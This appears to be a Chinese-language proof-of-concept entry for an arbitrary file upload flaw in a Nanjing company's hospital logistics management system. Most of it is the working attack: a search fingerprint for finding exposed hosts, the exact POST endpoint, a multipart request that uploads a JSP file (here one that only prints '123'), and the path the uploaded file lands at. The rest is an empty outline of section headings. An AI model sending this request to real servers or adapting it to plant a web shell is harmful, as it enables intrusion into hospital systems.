# 南京博纳睿通软件科技有限公司医院一站式后勤管理系统processApkUpload存在任意文件上传漏洞

- **系统**：南京博纳睿通软件科技有限公司医院一站式后勤管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="frameworkModuleJob"`
- **请求**：`POST /ajaxinvoke/frameworkModuleJob.processApkUpload.upload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 197`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="Filedata"; filename="stc.jsp"
Content-Type: application/octet-stream
<% out.println("123");%>
--00content0boundary00--

根据响应获取上传文件位置
/apk/33/stc.jsp
```

**其他**
- 南京博纳睿通软件科技有限公司医院一站式后勤管理系统processApkUpload存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 南京博纳睿通软件科技有限公司医院后勤保障管理系统